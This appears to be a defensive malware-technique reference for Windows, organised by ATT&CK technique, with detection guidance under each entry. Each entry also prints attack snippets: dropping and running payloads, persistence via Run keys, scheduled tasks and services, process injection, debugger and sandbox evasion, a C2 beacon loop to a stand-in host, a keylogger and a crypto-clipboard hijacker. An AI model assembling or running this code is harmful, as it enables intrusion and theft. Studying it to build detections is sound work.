FILE SYSTEM
Create / Drop File — writing a secondary payload to disk
DROPPER CreateFileW
▶
Most droppers and stage-2 loaders write an embedded or downloaded payload to disk using CreateFileW + WriteFile, often to %TEMP%, %APPDATA%, or C:\ProgramData. The payload is frequently encrypted or XOR'd in the binary and decrypted in memory before being written.
// C / WIN32 — drop and execute a payload
// Write embedded (decrypted) payload to %APPDATA% HANDLE hFile = CreateFileW( L"C:\\Users\\Public\\AppData\\Roaming\\update.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); DWORD written; WriteFile(hFile, decryptedPayload, payloadSize, &written, NULL); CloseHandle(hFile); // Execute dropped file ShellExecuteW(NULL, L"open", L"C:\\Users\\Public\\AppData\\Roaming\\update.exe", NULL, NULL, SW_HIDE);
// ANALYST TIP
  • Check for embedded resources/overlay data of unusual size — common staging spot for a second stage before WriteFile.
  • Look for suspicious paths: %TEMP%, %APPDATA%, C:\ProgramData, C:\Users\Public — legitimate installers rarely write executables to Public.
  • Filenames mimicking legit processes (update.exe, svchost32.exe, chrome_update.exe) are a strong signal.
// DETECTION
  • Sysmon Event ID 11 (FileCreate) — alert on EXE/DLL/script extensions written to user-writable, non-Program-Files paths.
  • Correlate FileCreate followed immediately by ProcessCreate (Event ID 1) of the same path — classic drop-and-execute.
  • YARA on disk/memory for the decrypted PE's MZ header appearing inside a non-PE host file (overlay payload).
Self-Deletion — removing the dropper after execution
ANTI-FORENSICS
▶
A loader deletes its own binary after spawning the payload to remove forensic artifacts. Since a running .exe cannot delete itself directly on Windows, malware commonly spawns cmd.exe or abuses MoveFileEx with a reboot-pending delete.
// Batch self-delete via cmd.exe
// Spawn a detached cmd that deletes the running exe wchar_t cmd[MAX_PATH + 64]; wsprintfW(cmd, L"/c ping 127.0.0.1 -n 2 & del /f /q \"%s\"", selfPath); ShellExecuteW(NULL, L"open", L"cmd.exe", cmd, NULL, SW_HIDE); // Alternative: schedule delete on reboot MoveFileExW(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
// DETECTION
  • Sysmon Event ID 1 showing cmd.exe /c ping 127.0.0.1 ... & del spawned by a short-lived parent process is a near-unique signature.
  • MOVEFILE_DELAY_UNTIL_REBOOT writes a PendingFileRenameOperations registry entry — inspect HKLM\SYSTEM\CurrentControlSet\Control\Session Manager.
Hidden / System Attributes — concealing dropped files from Explorer
DEFENSE EVASION
▶
After dropping a file, malware frequently sets FILE_ATTRIBUTE_HIDDEN and FILE_ATTRIBUTE_SYSTEM so the payload doesn't appear in Explorer with default settings.
SetFileAttributesW( L"C:\\ProgramData\\svcdata\\core.dat", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
// DETECTION
  • Sysmon does not log attribute changes directly — monitor file metadata during disk forensics or via EDR file-attribute-change telemetry.
  • Hunt for hidden+system EXE/DLL/DAT files outside known Windows component directories.
PERSISTENCE
Registry Run Key — T1547.001 Boot or Logon Autostart Execution
T1547.001 VERY COMMON
▶
The most common persistence mechanism: writing a value under HKCU\Software\Microsoft\Windows\CurrentVersion\Run (no admin needed) or the HKLM equivalent (admin), so the payload launches on every logon.
// C / WIN32 — RegSetValueEx persistence
HKEY hKey; RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey); RegSetValueExW(hKey, L"WindowsUpdate", 0, REG_SZ, (BYTE*)exePath, (lstrlenW(exePath) + 1) * sizeof(wchar_t)); RegCloseKey(hKey);
// PowerShell equivalent
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\Users\Public\update.exe"
// ANALYST TIP
  • Also check RunOnce, RunServices, and the policy-equivalent HKLM\...\Policies\Explorer\Run keys.
  • Value names mimicking legitimate software ("WindowsUpdate", "OneDriveSync", "AdobeARM") are a common naming pattern — verify the target path, not just the name.
// DETECTION
  • Sysmon Event ID 13 (RegistryEvent — value set) on Run/RunOnce key paths.
  • Autoruns / Autorunsc baseline diffing is the classic triage step.
  • Alert when the registered path points to %TEMP%, %APPDATA%, or Public directories.
Scheduled Task — T1053.005 Scheduled Task/Job
T1053.005
▶
Creates a Task Scheduler job to re-execute the payload on logon, at a fixed interval, or at system startup. Often used alongside or instead of Run keys for added resilience.
// schtasks.exe — recurring execution every 30 minutes
schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineCore" /tr "C:\Users\Public\update.exe" /sc minute /mo 30 /f
// COM ITaskService (used to evade command-line logging)
// Malware often builds tasks via the COM Task Scheduler API // (ITaskService -> ITaskFolder -> RegisterTaskDefinition) // instead of schtasks.exe, to avoid leaving a command line in process logs.
// DETECTION
  • Sysmon/Security Event ID 4698 — "A scheduled task was created."
  • Task names impersonating Microsoft/Edge/Adobe update tasks, especially in \Microsoft\Windows\ task paths not matching the real vendor's naming.
  • Hunt for schtasks /create spawned by Office processes, scripts, or browsers.
Service Installation — T1543.003 Windows Service
T1543.003
▶
Registers the payload as a Windows service so it runs as SYSTEM at boot before any user logs in — common in backdoors and worm components.
SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE); SC_HANDLE svc = CreateServiceW( scm, L"WinUpdateSvc", L"Windows Update Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, L"C:\\Windows\\System32\\winupdate.exe", NULL, NULL, NULL, NULL, NULL); StartServiceW(svc, 0, NULL);
// DETECTION
  • Security Event ID 7045 ("A service was installed") and Sysmon Event ID 13 on HKLM\SYSTEM\CurrentControlSet\Services\*.
  • Service binaries located outside C:\Windows\System32 claiming to be system components are highly suspicious.
Startup Folder Shortcut — T1547.001 (LNK drop)
T1547.001
▶
Drops a .lnk shortcut into the user's Startup folder (%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup) pointing to the payload, so it launches at every logon without registry edits.
// IShellLink COM interface — create .lnk
IShellLinkW* link; CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkW, (void**)&link); link->SetPath(L"C:\\Users\\Public\\update.exe"); IPersistFile* pf; link->QueryInterface(&IID_IPersistFile, (void**)&pf); pf->Save(L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk", TRUE);
// DETECTION
  • Sysmon Event ID 11 for .lnk file creation in any user's Startup folder.
  • Parse .lnk target paths for executables outside Program Files.
COM Hijacking — T1546.015 Component Object Model Hijacking
T1546.015
▶
Overwrites the InprocServer32 path of a COM CLSID under HKCU (which takes precedence over HKLM) so that any application instantiating that COM object loads the malicious DLL instead — a stealthy persistence used by Evelyn-style stealers and several APT loaders.
// Hijack a CLSID under HKCU (no admin required, overrides HKLM) RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)L"C:\\Users\\Public\\evil.dll", ...); // Path: HKCU\Software\Classes\CLSID\{XXXXXXXX-...}\InprocServer32
// DETECTION
  • Sysmon Event ID 13 writes to HKCU\Software\Classes\CLSID\{...}\InprocServer32 are rare in normal usage — strong detection signal.
  • Diff HKCU CLSID overrides against a known-good baseline for commonly hijacked CLSIDs (e.g. MMDeviceEnumerator, ShellFolder objects).
EXECUTION / INJECTION
Process Hollowing — T1055.012
T1055.012 SUSPENDED PROCESS
▶
Spawns a legitimate process suspended, unmaps its original image, writes the malicious PE into the hollowed memory region, fixes up the entry point, and resumes the thread — the process now runs attacker code under a trusted name (e.g. RegAsm.exe, svchost.exe).
// Skeleton — CreateProcess (suspended) → unmap → write → resume
STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi; CreateProcessW(NULL, L"C:\\Windows\\System32\\RegAsm.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); // 1. Get target ImageBaseAddress from PEB (ReadProcessMemory) // 2. NtUnmapViewOfSection(pi.hProcess, imageBase) // 3. VirtualAllocEx — allocate new region at preferred ImageBase // 4. WriteProcessMemory — write headers + sections of malicious PE // 5. SetThreadContext — patch Rcx/Eax (entry point) in CONTEXT // 6. ResumeThread(pi.hThread)
// ANALYST TIP
  • Dump the hollowed process's memory and compare the on-disk PE of the legit binary against the in-memory image — section headers and entry point will diverge.
  • RegAsm.exe, MSBuild.exe, aspnet_compiler.exe, and vbc.exe are popular hollowing targets for .NET-based stealers.
// DETECTION
  • A process created in CREATE_SUSPENDED state followed by NtUnmapViewOfSection + WriteProcessMemory + SetThreadContext is a near-canonical hollowing chain — EDR call-stack telemetry / ETW.
  • Memory region with PE header but mismatched VAD protections / backing file (private memory mapped as image).
Remote DLL Injection — T1055.001 CreateRemoteThread + LoadLibrary
T1055.001
▶
The classic injection pattern: open a handle to a target process, write the path of a malicious DLL into its memory, then create a remote thread that calls LoadLibraryW on that path — forcing the target process to load the DLL.
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid); LPVOID remoteBuf = VirtualAllocEx(hProc, NULL, lstrlenW(dllPath) * 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); WriteProcessMemory(hProc, remoteBuf, dllPath, lstrlenW(dllPath) * 2, NULL); LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW"); CreateRemoteThread(hProc, NULL, 0, pLoadLibraryW, remoteBuf, 0, NULL);
// DETECTION
  • CreateRemoteThread targeting a process from a different image (cross-process) with start address resolving to kernel32!LoadLibraryW is highly anomalous.
  • Sysmon Event ID 8 (CreateRemoteThread) and Event ID 7 (ImageLoad) of an unsigned DLL from a user-writable path shortly after.
APC Queue Injection — T1055.004 Asynchronous Procedure Call
T1055.004
▶
Queues an Asynchronous Procedure Call (shellcode address) to a thread of a target process (often created suspended). When the thread enters an alertable wait state, the APC fires and shellcode executes — used by "Early Bird" injection variants to evade hooks installed by AV/EDR.
// "Early Bird" APC injection CreateProcessW(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi); LPVOID remoteShellcode = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); WriteProcessMemory(pi.hProcess, remoteShellcode, shellcode, shellcodeSize, NULL); QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, 0); ResumeThread(pi.hThread);
// DETECTION
  • QueueUserAPC on a thread belonging to a process created in CREATE_SUSPENDED state, with a target address inside a PAGE_EXECUTE_READWRITE private region — strong heuristic for EDR.
  • Memory scan for RWX private regions containing shellcode stubs/NOP sleds.
ANTI-ANALYSIS
Anti-Debug Checks — T1622 Debugger Evasion
T1622
▶
Cheap, ubiquitous checks placed at function entry points and loops to detect a debugger and either exit silently or branch into decoy code.
// Common API-based checks
if (IsDebuggerPresent()) ExitProcess(0); BOOL debugged = FALSE; CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged); if (debugged) ExitProcess(0); // PEB.BeingDebugged flag (no API call — harder to hook) if (*(BYTE*)(__readgsqword(0x60) + 0x02)) ExitProcess(0); // Timing check — RDTSC delta indicates single-stepping ULONGLONG t1 = __rdtsc(); /* ... a few instructions ... */ ULONGLONG t2 = __rdtsc(); if ((t2 - t1) > THRESHOLD) ExitProcess(0);
// DETECTION
  • Static YARA on imports for clusters of IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQueryInformationProcess, OutputDebugString.
  • Dynamic analysis: patch PEB.BeingDebugged / NtGlobalFlag to 0 and hook NtQueryInformationProcess to defeat these checks during sandboxing.
Sandbox / VM Evasion — T1497 Virtualization/Sandbox Evasion
T1497
▶
Checks for artifacts typical of analysis sandboxes/VMs — low core/RAM counts, known driver/registry names, MAC vendor prefixes, mouse movement — and exits or sleeps if detected.
// Resource checks — sandboxes are often resource-constrained SYSTEM_INFO si; GetSystemInfo(&si); if (si.dwNumberOfProcessors < 2) ExitProcess(0); // Known VM registry artifacts // HKLM\HARDWARE\Description\System "SystemBiosVersion" contains "VBOX"/"VMWARE" // HKLM\SYSTEM\ControlSet001\Services\Disk\Enum\0 contains "VEN_VMWARE_" // User-interaction check — wait for mouse movement before unpacking POINT p1, p2; GetCursorPos(&p1); Sleep(5000); GetCursorPos(&p2); if (p1.x == p2.x && p1.y == p2.y) ExitProcess(0);
// DETECTION
  • Use sandboxes configured with realistic core/RAM counts, populated recent-document/MRU lists, and simulated mouse movement.
  • YARA on strings referencing VBOX, VMWARE, QEMU, SbieDll.dll, SANDBOXIE.
String Obfuscation / Decryption — T1027 Obfuscated Files or Information
T1027
▶
Sensitive strings (C2 domains, mutex names, registry paths, API names) are stored XOR'd, Base64'd, or RC4-encrypted and decoded into a stack buffer only at runtime — defeating naive string-based detection.
// Simple single-byte XOR string decryption
void DecryptString(char* buf, int len, BYTE key) { for (int i = 0; i < len; i++) buf[i] ^= key; } // Usage — decrypt C2 URL right before use, then re-encrypt or zero it char c2[] = { 0x1A, 0x0D, 0x05, 0x16, ... }; DecryptString(c2, sizeof(c2), 0x5A); // c2 now contains "hxxp://malicious-c2[.]com/api"
// DETECTION
  • Static analysis: locate tight loops doing byte-wise XOR/ADD over a fixed-size buffer near program start — common decryptor shape.
  • Dynamic: breakpoint after the decryption loop and dump the buffer to recover plaintext C2/config strings (used to build IOC feeds).
C2 / NETWORK
HTTP(S) Beaconing — T1071.001 Web Protocols
T1071.001
▶
Periodically sends an HTTP(S) request to a C2 endpoint with host-fingerprint data (often Base64/XOR encoded in a header, cookie, or POST body), then sleeps for a jittered interval before checking for tasking in the response.
// WinHTTP beacon loop (simplified)
while (1) { HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0); HINTERNET hConnect = WinHttpConnect(hSession, L"c2-domain[.]com", INTERNET_DEFAULT_HTTPS_PORT, 0); HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/beacon", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE); // host_id = base64(rc4(hostname + username + os_version, key)) WinHttpAddRequestHeaders(hRequest, L"X-Session-Id: " host_id, -1, WINHTTP_ADDREQ_FLAG_ADD); WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0); WinHttpReceiveResponse(hRequest, NULL); // parse response for tasking, execute, then... Sleep(baseSleepMs + (rand() % jitterMs)); // jittered sleep }
// DETECTION
  • Network: periodic connections to the same host/IP at near-fixed intervals (low jitter), often with a fixed-size or templated request body — classic beacon signature for NIDS/Zeek.
  • TLS JA3/JA3S fingerprinting on the WinHTTP/WinINet stack can flag mismatched User-Agent-vs-TLS-stack combinations.
  • Host: unusual processes (e.g. powershell.exe, rundll32.exe) making outbound HTTPS connections — Sysmon Event ID 3.
Domain Generation Algorithm — T1568.002 Dynamic Resolution: DGA
T1568.002
▶
Deterministically generates a list of candidate C2 domains from a seed (e.g. current date), then tries resolving each until one responds — making takedown/blocklisting far harder than a static domain list.
// Date-seeded DGA (simplified)
void GenerateDomain(char* out, int year, int month, int day) { unsigned int seed = year * 10000 + month * 100 + day; for (int i = 0; i < 12; i++) { seed = seed * 1103515245 + 12345; out[i] = 'a' + (seed % 26); } strcpy(out + 12, ".com"); } // Tries domain[0], domain[1], ... domain[N] until one resolves to the C2
// DETECTION
  • DNS: high volume of NXDOMAIN responses for randomly-shaped, pronounceable domains from a single host — classic DGA fingerprint for DNS analytics/ML classifiers.
  • Entropy/n-gram scoring of queried hostnames; cluster by resolving registrar/ASN patterns.
CREDENTIAL ACCESS
Keylogger Hook — T1056.001 Keylogging
T1056.001
▶
Installs a low-level global keyboard hook (WH_KEYBOARD_LL) to capture every keystroke system-wide, logging to a local file that is later exfiltrated alongside other stolen data.
HHOOK hHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandleW(NULL), 0); LRESULT LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { if (nCode == HC_ACTION && wParam == WM_KEYDOWN) { KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam; LogKeyToFile(kb->vkCode); } return CallNextHookEx(hHook, nCode, wParam, lParam); }
// DETECTION
  • SetWindowsHookExW with WH_KEYBOARD_LL from a non-accessibility, non-IME process is a strong indicator — EDR API hooking telemetry.
  • Hunt for processes continuously writing small appended chunks to a hidden log file in %TEMP%/%APPDATA%.
Clipboard Hijacker — Cryptocurrency address swapping
CRYPTO THEFT
▶
Continuously polls or hooks the clipboard; when the content matches a regex for a BTC/ETH/TRON wallet address, it is silently replaced with an attacker-controlled address of the same format — observed in the StealcWorm clipboard hijacker.
// Polling-based clipboard hijack loop
while (1) { if (OpenClipboard(NULL)) { HANDLE hData = GetClipboardData(CF_TEXT); char* text = (char*)GlobalLock(hData); if (MatchesBtcRegex(text) || MatchesEthRegex(text) || MatchesTronRegex(text)) { EmptyClipboard(); SetClipboardData(CF_TEXT, attackerWalletHandle); } GlobalUnlock(hData); CloseClipboard(); } Sleep(500); }
// DETECTION
  • High-frequency OpenClipboard/SetClipboardData calls from a background process not associated with copy/paste UI actions.
  • YARA on regex-pattern strings for BTC (^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$), ETH (^0x[a-fA-F0-9]{40}$), and TRON (^T[a-zA-Z0-9]{33}$) address formats embedded in the binary.
